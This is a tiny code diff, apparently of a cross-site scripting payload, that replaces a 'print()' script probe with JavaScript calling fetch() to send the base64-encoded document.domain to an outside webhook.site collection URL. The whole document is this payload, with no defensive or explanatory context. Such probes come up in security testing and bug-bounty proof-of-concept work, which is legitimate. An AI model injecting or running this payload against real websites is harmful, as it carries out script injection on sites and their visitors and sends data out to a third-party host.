@@ -1,1 +1,2 @@
-<script>print()</script>
+let url = "https://webhook.site/f3899668-1750-4ddf-9612-b044618c3c92";
+fetch(url + "?x=" + btoa(document.domain));
